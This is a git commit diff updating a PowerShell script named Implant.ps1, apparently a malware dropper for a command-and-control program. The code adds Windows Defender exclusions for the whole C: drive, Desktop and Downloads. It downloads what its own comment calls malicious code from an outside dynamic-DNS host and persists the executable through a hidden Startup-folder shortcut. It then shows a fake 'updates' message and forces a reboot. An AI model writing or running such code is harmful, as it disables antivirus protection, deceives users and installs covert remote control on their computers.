b586a1f82409d882faab943f8fe1b2e7426f20ff
Eduard Barbu <115542962+RKThirteen@users.noreply.github.com>
2024-06-14 22:52:07 +0300

    Update Implant.ps1

--- EAE/Implant.ps1
+++ EAE/Implant.ps1
@@ -1,6 +1,4 @@
 
-# Verifica daca userul a dat run as Admin
-
 function Test-Administrator {
     $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
     $adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
@@ -13,75 +11,81 @@ if (-not (Test-Administrator)) {
     exit 1
 }
 
-# Gaseste calea aplicatiei C2
+# Function to find the path of C2.exe
 function Find-C2Executable {
     param (
-        [string]$fileName = "C2.exe"
+        [string]$fileName = "C2_release.exe"
     )
     $paths = Get-ChildItem -Path C:\ -Filter $fileName -Recurse -ErrorAction SilentlyContinue
     if ($paths.Count -gt 0) {
         return $paths[0].FullName
     } else {
-        Write-Error "C2.exe not found"
+        Write-Error "C2_release.exe not found"
         exit 1
     }
 }
 
-# Cai care sunt excluse
+# Define the paths to exclude 
 $pathToExclude = "C:\" 
 
 $desktopPath = [System.IO.Path]::Combine($env:USERPROFILE, "Desktop")
 
 $downloadsPath = [System.IO.Path]::Combine($env:USERPROFILE, "Downloads")
 
-# Adauga caile la exclusion list
+# Add the path to the Windows Defender exclusion list
 Add-MpPreference -ExclusionPath $pathToExclude
 
 Add-MpPreference -ExclusionPath $desktopPath
 
 Add-MpPreference -ExclusionPath $downloadsPath
 
-# Verifica exclusions
+# Verify that the exclusion was added
 $exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
 if ($exclusions -contains $pathToExclude -and $exclusions -contains $desktopPath -and $exclusions -contains $downloadsPath) {
+    
+    #Invoke a web request to download malicious code
+        Invoke-WebRequest -Uri http://malwinator.chickenkiller.com/download -Method POST -ContentType "application/x-www-form-urlencoded" -Body @{"file"="C2_release.exe"} -OutFile "C2_release.exe"
 
-    # Obtine calea catre C2
+    # Define the path to Adobe Acrobat's executable file
 	$progPath = Find-C2Executable
 
-    # Calea catre Startup
+    # Define the path to the Startup folder
 	$startupFolderPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
 
-# Redenumeste shortcut-ul
-	$shortcutPath = [System.IO.Path]::Combine($startupFolderPath, "C2.lnk")
+# Define the path for the new shortcut
+	$shortcutPath = [System.IO.Path]::Combine($startupFolderPath, "Yoink.lnk")
 
-# Creeaza un obiect WScript.Shell COM
+# Create a WScript.Shell COM object
 	$wshShell = New-Object -ComObject WScript.Shell
 
-# Creeaza shortcut-ul
+# Create the shortcut
 	$shortcut = $wshShell.CreateShortcut($shortcutPath)
 
-# Calea shortcut-ului_+salvare
+# Set the target path for the shortcut
 	$shortcut.TargetPath = $progPath 
-	$shortcut.Save()
 
-# Calea catre videoclip, care se afla pe Desktop
+# Save the shortcut
+	$shortcut.Save()
+# Make the icon a hidden item
+
+	Set-ItemProperty -Path $progPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+
+# Path to the video file on the desktop
         $videoPath = [System.IO.Path]::Combine($env:USERPROFILE, "Desktop", "NiceComputer!.mp4")
 
-# Daca o gaseste, reda videoclipul
-if (Test-Path $videoPath) {
-    Start-Process $videoPath
+# Check if the video file exists
+#if (Test-Path $videoPath) {
+    # Start the video using the default media player
+#    Start-Process $videoPath
     #Write-Host "Playing video: $videoPath"
-} else {
-    Write-Error "Video file not found: $videoPath"
-}
-
-    #Write-Host "Successfully added paths to the exclusion list."
-    #Dupa ce creeaza shortcutul+reda videoclipul, adoarme procesul 10 secunde, apoi restart
+#} else {
+#    Write-Error "Video file not found: $videoPath"
+#}
     
+    Write-Host "Cleanup complete. Restarting to finalize updates in a few seconds"
+    #Write-Host "Successfully added paths to the exclusion list."
     Start-Sleep -Seconds 10
     Restart-Computer -Force
 } else {
     Write-Error "Failed to add all paths to exclusion list"
 }
-
-#Acum, dupa Restart, C2 va porni automat la startup
